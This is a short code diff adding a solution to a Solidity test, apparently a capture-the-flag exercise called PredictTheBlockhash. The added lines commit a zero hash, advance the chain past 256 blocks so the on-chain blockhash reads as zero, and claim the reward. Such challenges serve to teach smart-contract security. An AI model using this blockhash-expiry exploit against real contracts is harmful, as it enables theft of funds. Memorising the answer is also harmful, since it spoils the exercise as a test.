@@ -25,6 +25,13 @@ contract PredictTheBlockhashTest is Test {
 
         // Put your solution here
 
+        // - Answer the contract with zero hash
+        // - Wait for at least 256 blocks to pass to be sure that blockhash is unavailable onchain
+        // - Call settle to get the reward
+        exploitContract.answerWithZero{value: 1 ether}();
+        vm.roll(block.number + 256 + 2);
+        exploitContract.settleOrRevert();
+
         _checkSolved();
     }
 
